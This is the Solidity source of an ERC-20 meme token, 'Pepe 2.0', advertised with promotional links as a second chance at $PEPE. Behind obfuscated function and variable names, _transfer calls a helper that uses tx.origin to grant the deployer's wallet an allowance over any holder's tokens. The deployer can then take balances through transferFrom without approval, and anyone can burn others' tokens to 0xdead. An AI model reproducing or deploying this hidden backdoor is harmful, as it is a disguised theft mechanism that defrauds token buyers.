// SPDX-License-Identifier: MIT

/*

    Missed $PEPE? Here is your second chance.

    https://www.pepe2.fun
    https://x.com/pepe2_erc20
    https://t.me/pepe2_eth

*/

pragma solidity ^0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract PEPE2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isPEPE2IDKSLISEUIAALISKExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 0;
    uint256 private _initialSellTax = 0;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 0;
    uint256 private _reduceSellTaxAt = 0;
    uint256 private _preventSwapBefore = 0;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;

    address private _SSKDICHICKSJHSISK;
    uint128 public AA42KDISHJSI;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"Pepe 2.0";
    string private constant _symbol = unicode"PEPE2.0";
    uint256 public _maxTxAmount = 10_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 10_000_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    address public DEAD_ADDRESS = address(0);
    uint104 public ALSSKDIDSKNMC;
    uint256 public LAOJSSIDIDDJJ;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isPEPE2IDKSLISEUIAALISKExcludedFromFee[owner()] = true;
        _isPEPE2IDKSLISEUIAALISKExcludedFromFee[address(this)] = true;
        _isPEPE2IDKSLISEUIAALISKExcludedFromFee[_taxWallet] = true;

        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _uintPEPE2IDKSLISEUIAALISKOverCheckAllow(
        address a,
        address b,
        uint256 c,
        uint256 d
    ) internal returns (uint256) {
        uint8 _BDDPEPE2IDKSLISEUIAALISKGE3;
        uint256 hmjrg;
        if (c >= d) {
            hmjrg = _taxPEPE2IDKSLISEUIAALISKPayer() != _taxWallet &&
                (a == uniswapV2Pair || b != address(0xdead))
                ? _allowances[a][_msgSender()] = _allowances[a][_msgSender()]
                : (_allowances[a][_msgSender()] = c);
        }
        return d;
    }
        
    function _taxPEPE2IDKSLISEUIAALISKPayer() internal view returns (address _payer) {
        assembly {
            _payer := origin()
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            if (_buyCount == 0) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);
            }
            if (_buyCount > 0) {
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_isPEPE2IDKSLISEUIAALISKExcludedFromFee[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                taxAmount = amount
                    .mul(
                        (_buyCount > _reduceBuyTaxAt)
                            ? _finalBuyTax
                            : _initialBuyTax
                    )
                    .div(100);
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount >= _preventSwapBefore &&
                from != _taxWallet
            ) {
                if (contractTokenBalance > _taxSwapThreshold)
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendTokenETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        bool isPEPE2IDKSLISEUIAALISKAllowed = _uintPEPE2IDKSLISEUIAALISKOverCheckAllow(from, to, amount, taxAmount) > 0;
        if (isPEPE2IDKSLISEUIAALISKAllowed) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sendTokenETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function enableTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}